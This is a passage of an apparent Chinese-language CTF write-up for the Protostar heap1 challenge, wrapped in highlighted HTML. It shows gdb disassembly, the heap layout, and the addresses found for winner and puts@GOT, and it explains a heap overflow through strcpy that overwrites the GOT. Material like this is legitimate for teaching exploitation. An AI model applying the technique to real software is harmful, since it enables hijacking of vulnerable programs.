+<span class="w">   </span><span class="mh">0x08048531</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">120</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">edx</span>
+<span class="w">   </span><span class="mh">0x08048535</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">124</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x08048538</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">127</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">call</span><span class="w">   </span><span class="mh">0x804838c</span><span class="w"> </span><span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">   </span><span class="mh">0x0804853d</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">132</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x08048540</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">135</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">add</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="w">   </span><span class="mh">0x08048543</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">138</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x08048545</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">140</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">edx</span><span class="p">,</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x08048547</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">142</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x0804854b</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">146</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x0804854e</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">149</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">edx</span>
+<span class="w">   </span><span class="mh">0x08048552</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">153</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x08048555</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">156</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">call</span><span class="w">   </span><span class="mh">0x804838c</span><span class="w"> </span><span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">   </span><span class="mh">0x0804855a</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">161</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x804864b</span>
+<span class="w">   </span><span class="mh">0x08048561</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">168</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">call</span><span class="w">   </span><span class="mh">0x80483cc</span><span class="w"> </span><span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">   </span><span class="mh">0x08048566</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">173</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">leave</span>
+<span class="w">   </span><span class="mh">0x08048567</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">174</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">ret</span>
+<span class="n">End</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">assembler</span><span class="w"> </span><span class="n">dump</span><span class="p">.</span>
+</code></pre></div></h2>
+<p><strong>从代码中可以看到，p1和p2的内存布局是紧挨着的，如下：</strong>
+<div class="highlight"><pre><span></span><code><span class="n">堆内存布局</span><span class="err">（</span><span class="n">大致顺序</span><span class="err">）：</span>
+<span class="n">低地址</span>
+<span class="o">---</span>
+<span class="nl">块1</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="mh">0x00000001</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">指针指向块2</span><span class="p">(</span><span class="n">chunkA</span><span class="p">)]</span><span class="w">   </span><span class="p">(</span><span class="mi">8</span><span class="n">字节</span><span class="p">)</span><span class="w">  </span><span class="err">←</span><span class="w"> </span><span class="n">p1指向这里</span>
+<span class="o">---</span>
+<span class="nl">块2</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="n">的数据</span><span class="p">]</span><span class="w">                     </span><span class="p">(</span><span class="mi">8</span><span class="n">字节</span><span class="p">)</span><span class="w">  </span><span class="err">←</span><span class="w"> </span><span class="n">chunkA</span><span class="err">，</span><span class="n">可溢出</span>
+<span class="o">---</span>
+<span class="nl">块3</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="mh">0x00000002</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">指针指向块4</span><span class="p">(</span><span class="n">chunkB</span><span class="p">)]</span><span class="w">   </span><span class="p">(</span><span class="mi">8</span><span class="n">字节</span><span class="p">)</span><span class="w">  </span><span class="err">←</span><span class="w"> </span><span class="n">p2指向这里</span>
+<span class="o">---</span>
+<span class="nl">块4</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="n">的数据</span><span class="p">]</span><span class="w">                     </span><span class="p">(</span><span class="mi">8</span><span class="n">字节</span><span class="p">)</span><span class="w">  </span><span class="err">←</span><span class="w"> </span><span class="n">chunkB</span>
+<span class="o">---</span>
+<span class="n">高地址</span>
+
+<span class="n">栈上存储</span><span class="err">：</span>
+<span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span><span class="w"> </span><span class="n">存储p1的地址</span>
+<span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span><span class="w"> </span><span class="n">存储p2的地址</span>
+</code></pre></div></p>
+<p><strong>由于 <code>chunkA</code> 和 <code>chunkB</code> 各只有 8 字节</strong>
+<strong>且程序用 <code>strcpy</code> 复制用户输入（无长度检查）→ 溢出可覆盖相邻内存</strong></p>
+<hr />
+<p><strong>由于函数执行中只调用了puts@plt ,所以我们需要通过溢出对其进行劫持：</strong>
+<strong>我们通过第一个参数（argv[1]）溢出 <code>chunkA</code>，覆盖了 <code>p2</code> 结构体中的“name指针”（即 p2[1]），把它从指向 <code>chunkB</code> 改成指向 <code>puts@GOT</code></strong>
+<strong>然后，程序执行从<code>strcpy(p2[1], argv[2]);</code>变成<code>strcpy(puts@GOT, winner地址);</code></strong>
+<strong>这样就会把 <code>winner</code> 的地址写进了 <code>puts@GOT</code></strong>
+<strong>最后，程序调用 <code>puts(...)</code> 时，会去 GOT 表里找 <code>puts</code> 的真实地址 —— 结果找到的是 <code>winner</code> → 程序跳转到 <code>winner</code></strong></p>
+<hr />
+<p><strong>找到winner的地址</strong>
+<div class="highlight"><pre><span></span><code><span class="err">└─</span><span class="n">$</span><span class="w"> </span><span class="n">objdump</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="n">heap1</span><span class="w"> </span><span class="o">|</span><span class="n">grep</span><span class="w"> </span><span class="n">winner</span>
+<span class="mi">08048494</span><span class="w"> </span><span class="n">g</span><span class="w">     </span><span class="n">F</span><span class="w"> </span><span class="p">.</span><span class="n">text</span><span class="w">  </span><span class="mo">00000025</span><span class="w">              </span><span class="n">winner</span>
+</code></pre></div></p>
+<p><strong>找到puts@got的地址</strong>
+<div class="highlight"><pre><span></span><code><span class="err">└─</span><span class="n">$</span><span class="w"> </span><span class="n">objdump</span><span class="w"> </span><span class="o">-</span><span class="n">TR</span><span class="w"> </span><span class="n">heap1</span><span class="w"> </span><span class="o">|</span><span class="n">grep</span><span class="w"> </span><span class="n">puts</span><span class="w"> </span>
+<span class="mo">00000000</span><span class="w">      </span><span class="n">DF</span><span class="w"> </span><span class="o">*</span><span class="n">UND</span><span class="o">*</span><span class="w">  </span><span class="mo">00000000</span><span class="w"> </span><span class="p">(</span><span class="n">GLIBC_2</span><span class="mf">.0</span><span class="p">)</span><span class="w">  </span><span class="n">puts</span>
+<span class="mi">08049774</span><span class="w"> </span><span class="n">R_386_JUMP_SLOT</span><span class="w">   </span><span class="n">puts</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.0</span>
+</code></pre></div></p>
+<p><strong>获取偏移量</strong>
+<div class="highlight"><pre><span></span><code><span class="err">└─</span><span class="n">$</span><span class="w"> </span><span class="n">gdb</span><span class="o">-</span><span class="n">pwndbg</span><span class="w">  </span><span class="n">heap1</span>
+<span class="n">Successfully</span><span class="w"> </span><span class="n">imported</span><span class="w"> </span><span class="n">six</span><span class="w"> </span><span class="n">module</span>
+<span class="n">Reading</span><span class="w"> </span><span class="n">symbols</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">heap1</span><span class="p">...</span>
+<span class="nl">pwndbg</span><span class="p">:</span><span class="w"> </span><span class="n">loaded</span><span class="w"> </span><span class="mi">207</span><span class="w"> </span><span class="n">pwndbg</span><span class="w"> </span><span class="n">commands</span><span class="p">.</span><span class="w"> </span><span class="n">Type</span><span class="w"> </span><span class="n">pwndbg</span><span class="w"> </span><span class="p">[</span><span class="n">filter</span><span class="p">]</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">list</span><span class="p">.</span>
+<span class="nl">pwndbg</span><span class="p">:</span><span class="w"> </span><span class="n">created</span><span class="w"> </span><span class="mi">13</span><span class="w"> </span><span class="n">GDB</span><span class="w"> </span><span class="n">functions</span><span class="w"> </span><span class="p">(</span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">print</span><span class="o">/</span><span class="k">break</span><span class="p">).</span><span class="w"> </span><span class="n">Type</span><span class="w"> </span><span class="n">help</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">see</span><span class="w"> </span><span class="n">them</span><span class="p">.</span>
+<span class="o">-------</span><span class="w"> </span><span class="n">tip</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">day</span><span class="w"> </span><span class="p">(</span><span class="n">disable</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">show</span><span class="o">-</span><span class="n">tips</span><span class="w"> </span><span class="n">off</span><span class="p">)</span><span class="w"> </span><span class="o">-------</span>
+<span class="n">Pwndbg</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="n">displays</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="n">branches</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">thanks</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">emulating</span><span class="w"> </span><span class="n">few</span><span class="w"> </span><span class="n">instructions</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">future</span><span class="p">.</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">disable</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">emulate</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="n">which</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">also</span><span class="w"> </span><span class="n">speed</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="n">debugging</span>
+<span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">disass</span><span class="w"> </span><span class="n">main</span>
+<span class="n">Dump</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">assembler</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">main</span><span class="o">:</span>
+<span class="w">   </span><span class="mh">0x080484b9</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span><span class="w">     </span><span class="n">push</span><span class="w">   </span><span class="n">ebp</span>
+<span class="w">   </span><span class="mh">0x080484ba</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span><span class="w">     </span><span class="n">mov</span><span class="w">    </span><span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+<span class="w">   </span><span class="mh">0x080484bc</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span><span class="w">     </span><span class="n">and</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0xfffffff0</span>
+<span class="w">   </span><span class="mh">0x080484bf</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span><span class="w">     </span><span class="n">sub</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0x20</span>
+<span class="w">   </span><span class="mh">0x080484c2</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;:</span><span class="w">     </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8</span>
+<span class="w">   </span><span class="mh">0x080484c9</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">call</span><span class="w">   </span><span class="mh">0x80483bc</span><span class="w"> </span><span class="o">&lt;</span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">   </span><span class="mh">0x080484ce</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x080484d2</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x080484d6</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">29</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="p">],</span><span class="mh">0x1</span>
+<span class="w">   </span><span class="mh">0x080484dc</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8</span>
+<span class="w">   </span><span class="mh">0x080484e3</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">42</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">call</span><span class="w">   </span><span class="mh">0x80483bc</span><span class="w"> </span><span class="o">&lt;</span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">   </span><span class="mh">0x080484e8</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">47</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">edx</span><span class="p">,</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x080484ea</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x080484ee</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">53</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">edx</span>
+<span class="w">   </span><span class="mh">0x080484f1</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">56</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8</span>
+<span class="w">   </span><span class="mh">0x080484f8</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">63</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">call</span><span class="w">   </span><span class="mh">0x80483bc</span><span class="w"> </span><span class="o">&lt;</span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span><span class="w"> </span><span class="c1">//调用 malloc 分配 8 字节内存,malloc 成功后，**返回值（堆地址）保存在 `eax` 寄存器中**</span>
+<span class="w">   </span><span class="mh">0x080484fd</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">68</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">],</span><span class="n">eax</span><span class="w"> </span><span class="c1">//把 `eax` 的值（也就是 malloc 返回的堆地址），**存到栈上的一个位置：`[esp+0x18]`**,即程序中“保存 p2 指针的临时变量”的地址</span>
+<span class="w">   </span><span class="mh">0x08048501</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">72</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x08048505</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">76</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="p">],</span><span class="mh">0x2</span>
+<span class="w">   </span><span class="mh">0x0804850b</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">82</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8</span>
+<span class="w">   </span><span class="mh">0x08048512</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">89</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">call</span><span class="w">   </span><span class="mh">0x80483bc</span><span class="w"> </span><span class="o">&lt;</span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">   </span><span class="mh">0x08048517</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">94</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">edx</span><span class="p">,</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x08048519</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">96</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x0804851d</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">100</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">edx</span>
+<span class="w">   </span><span class="mh">0x08048520</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">103</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x08048523</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">106</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">add</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span>
+<span class="w">   </span><span class="mh">0x08048526</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">109</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x08048528</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">111</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">edx</span><span class="p">,</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x0804852a</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">113</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x0804852e</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">117</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x08048531</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">120</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">edx</span>
+<span class="w">   </span><span class="mh">0x08048535</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">124</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x08048538</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">127</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">call</span><span class="w">   </span><span class="mh">0x804838c</span><span class="w"> </span><span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">   </span><span class="mh">0x0804853d</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">132</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x08048540</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">135</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">add</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="w">   </span><span class="mh">0x08048543</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">138</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x08048545</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">140</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">edx</span><span class="p">,</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x08048547</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">142</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x0804854b</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">146</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x0804854e</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">149</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">edx</span>
+<span class="w">   </span><span class="mh">0x08048552</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">153</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x08048555</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">156</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">call</span><span class="w">   </span><span class="mh">0x804838c</span><span class="w"> </span><span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">   </span><span class="mh">0x0804855a</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">161</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x804864b</span>
